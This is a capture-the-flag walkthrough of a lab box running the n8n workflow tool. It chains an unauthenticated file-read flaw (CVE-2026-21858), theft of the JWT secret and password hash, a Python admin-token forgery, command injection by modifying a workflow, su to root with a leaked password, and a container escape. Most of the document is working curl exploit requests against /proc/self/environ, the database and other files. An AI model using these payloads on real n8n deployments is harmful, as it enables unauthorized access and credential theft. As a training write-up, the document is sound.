# Cypheron — Nightmare Walkthrough

**Event:** 2026: An AI Odyssey CTF
**Challenge:** Nightmare (Insane)
**Target:** `10.67.145.144`
**Flags:** `THM{nightmare_just_begun}` · `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`

---

## Overview

The target is an **n8n v1.120.4** workflow automation instance exposed on port 5678. One public form endpoint is left unlocked. The full kill chain chains an unauthenticated file read CVE through JWT forgery, RCE via workflow modification, and a final container escape to the host.

```
CVE-2026-21858 (LFI)
  → /proc/self/environ (JWT secret + encryption key)
  → database.sqlite (secret webhook workflow)
  → /webhook/secret-webhook (RCE as node)
  → user flag
  → JWT forgery (n8n source archaeology)
  → admin access → PATCH workflow → Node.js PTY
  → su root (/setup.sh password)
  → /host-root/flag.txt (container escape)
  → root flag
```

---

## Enumeration

### Port Scan

```bash
nmap -sV --min-rate 3000 -p- 10.67.145.144
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
5678/tcp open  http    n8n workflow automation (v1.120.4)
```

### Web Recon

Visiting `http://10.67.145.144:5678` confirms **n8n v1.120.4** via the page meta tag:

```html
<meta name="n8n:config:sentry" content="eyJ...InJlbGVhc2UiOiJuOG5AMS4xMjAuNCJ9">
```

Decoded: `{"release":"n8n@1.120.4"}`

The only public-facing endpoint:

```
GET  http://10.67.145.144:5678/form/file-processor   → Document Upload form
POST http://10.67.145.144:5678/form/file-processor   → Submits file to workflow
```

All other REST/API routes return `401 Unauthorized`. Login endpoint has rate limiting.

---

## CVE-2026-21858 — Unauthenticated Arbitrary File Read

### The Vulnerability

n8n's Form Trigger internally represents uploaded files as objects with the structure:

```json
{
  "filepath": "/tmp/upload_abc123",
  "originalFilename": "document.pdf",
  "mimetype": "text/plain",
  "size": 1024
}
```

When a `multipart/form-data` request is received, n8n populates `filepath` with the actual temp path of the upload. However, n8n's form handler **also accepts `Content-Type: application/json`** and directly trusts user-supplied values in the `files` object — including `filepath`.

The workflow then reads from that path and returns the content. No authentication required.

### The Hint

> *"a little too trusting about what its visitors claim to carry"*

Visitors can **claim** their file already lives at any path on the server's filesystem. n8n believes them.

### Exploit

```bash
# Arbitrary file read
curl -s -X POST http://10.67.145.144:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  -d '{
    "files": {
      "field-0": {
        "filepath": "/etc/passwd",
        "originalFilename": "x",
        "mimetype": "text/plain",
        "size": 1
      }
    }
  }'
```

---

## Step 1 — Extract Secrets from /proc/self/environ

```bash
curl -s -X POST http://10.67.145.144:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  -d '{
    "files": {
      "field-0": {
        "filepath": "/proc/self/environ",
        "originalFilename": "x",
        "mimetype": "text/plain",
        "size": 1
      }
    }
  }' | tr '\0' '\n'
```

Key values extracted:

```
N8N_JWT_SECRET=cve-2026-21858-lab-jwt-secret
N8N_ENCRYPTION_KEY=<encryption_key>
```

---

## Step 2 — Exfiltrate the n8n SQLite Database

```bash
# Download the database
curl -s -X POST http://10.67.145.144:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  -d '{
    "files": {
      "field-0": {
        "filepath": "/home/node/.n8n/database.sqlite",
        "originalFilename": "x",
        "mimetype": "application/octet-stream",
        "size": 1
      }
    }
  }' --output database.sqlite

# Parse it locally
sqlite3 database.sqlite
```

```sql
-- List all workflows
SELECT id, name, active FROM workflow_entity;
```

```
dtcGODz9L699bB7f | Internal Automation — DO NOT SHARE | 1
```

```sql
-- Get webhook details
SELECT * FROM webhook_entity WHERE workflowId = 'dtcGODz9L699bB7f';
```

```
webhookPath: secret-webhook
method: POST
```

Also visible: other players' saved workflows leaking flag paths including `/home/node/flag-user-lfi.txt`.

---

## Step 3 — User Flag via LFI

```bash
curl -s -X POST http://10.67.145.144:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  -d '{
    "files": {
      "field-0": {
        "filepath": "/home/node/flag-user-lfi.txt",
        "originalFilename": "x",
        "mimetype": "text/plain",
        "size": 1
      }
    }
  }'
```

```
THM{nightmare_just_begun}
```

---

## Step 4 — Trigger the Secret Webhook (Initial RCE)

```bash
curl -s -X POST http://10.67.145.144:5678/webhook/secret-webhook \
  -H 'Content-Type: application/json' \
  -d '{}'
```

```json
{"output": "uid=1000(node) gid=1000(node) groups=1000(node)"}
```

The "Internal Automation" workflow executes a hardcoded shell command (`id`) and returns the output. We have **RCE as `node`**, but the command is hardcoded — we need admin access to change it.

---

## Step 5 — JWT Forgery for n8n Admin Access

### Source Code Archaeology

n8n v1.120.4 source on GitHub — `packages/cli/src/auth/auth.service.ts`:

```typescript
createJWTHash(user: User): string {
  return createHash('sha256')
    .update(`${user.email}:${user.password}`)
    .digest('base64')
    .substring(0, 10);
}
```

The JWT payload includes a `hash` field equal to `sha256("email:bcrypt_hash").digest('base64')[:10]`.

### Extract User Credentials from DB

```sql
SELECT email, password FROM user_entity;
```

```
admin@n8n.local | $2b$10$<bcrypt_hash>
```

### Forge the JWT

```python
import jwt, hashlib, base64

email = "admin@n8n.local"
bcrypt_hash = "$2b$10$<full_bcrypt_hash_from_db>"
jwt_secret = "cve-2026-21858-lab-jwt-secret"

# Compute the hash field
raw = f"{email}:{bcrypt_hash}"
hash_field = base64.b64encode(
    hashlib.sha256(raw.encode()).digest()
).decode()[:10]

# Forge the token
token = jwt.encode(
    {
        "id": "<user_id_from_db>",
        "email": email,
        "hash": hash_field
    },
    jwt_secret,
    algorithm="HS256"
)

print(token)
```

### Authenticate

```bash
curl -s http://10.67.145.144:5678/rest/workflows \
  -H "Cookie: n8n-auth=<forged_token>"
# Returns full workflow list → admin confirmed
```

---

## Step 6 — Modify the Workflow for Full RCE

Replace the hardcoded `id` command with a Node.js PTY script for an interactive shell:

```bash
# Get current workflow definition
curl -s http://10.67.145.144:5678/rest/workflows/dtcGODz9L699bB7f \
  -H "Cookie: n8n-auth=<forged_token>" | jq . > workflow.json

# Modify the Execute Command node's command field to:
# node -e "require('child_process').spawn('/bin/bash',['-i'],{stdio:'inherit'})"

# PATCH it back
curl -s -X PATCH http://10.67.145.144:5678/rest/workflows/dtcGODz9L699bB7f \
  -H "Cookie: n8n-auth=<forged_token>" \
  -H "Content-Type: application/json" \
  -d @workflow_modified.json
```

Trigger again to get shell:

```bash
curl -s -X POST http://10.67.145.144:5678/webhook/secret-webhook \
  -H 'Content-Type: application/json' \
  -d '{}'
```

---

## Step 7 — Privilege Escalation to Root

Read the setup script (discoverable via LFI or filesystem enumeration as `node`):

```bash
curl -s -X POST http://10.67.145.144:5678/form/file-processor \
  -H 'Content-Type: application/json' \
  -d '{
    "files": {
      "field-0": {
        "filepath": "/setup.sh",
        "originalFilename": "x",
        "mimetype": "text/plain",
        "size": 1
      }
    }
  }'
```

Contains hardcoded root password: `N1ghtm4r3R00t!CTF2026`

From the Node.js PTY shell via the modified workflow:

```bash
su root
# Password: N1ghtm4r3R00t!CTF2026
```

---

## Step 8 — Container Escape & Root Flag

The box runs inside Docker. The host filesystem is bind-mounted at `/host-root/`:

```bash
cat /host-root/flag.txt
```

```
THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}
```

---

## Vulnerability Summary

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2026-21858 | n8n Form Trigger JSON body deserialization | Unauthenticated arbitrary file read |
| N/A | Hardcoded JWT secret + weak hash formula | JWT forgery → admin access |
| N/A | Workflow Execute Command node | Authenticated RCE |
| N/A | Hardcoded root password in setup script | Privilege escalation |
| N/A | Docker bind-mount `/host-root/` | Container escape |

---

## Key Takeaways

- **n8n Form Triggers** should not process raw JSON bodies unless explicitly designed to — multipart parsing and JSON parsing must not share code paths that trust user-supplied file metadata.
- **`/proc/self/environ`** is a goldmine on compromised processes: secrets, tokens, and keys frequently live there.
- **Source code reading is a skill** — the 10-char JWT hash truncation was only discoverable by reading `auth.service.ts` directly.
- **Shared CTF environments leak data** — other players' stored workflows in the same DB exposed flag paths.
- **Docker containers with host bind-mounts** are not isolation boundaries — `/host-root/` made the container escape trivial.

---

*Solved as part of 2026: An AI Odyssey CTF — Cypheron challenge set.*
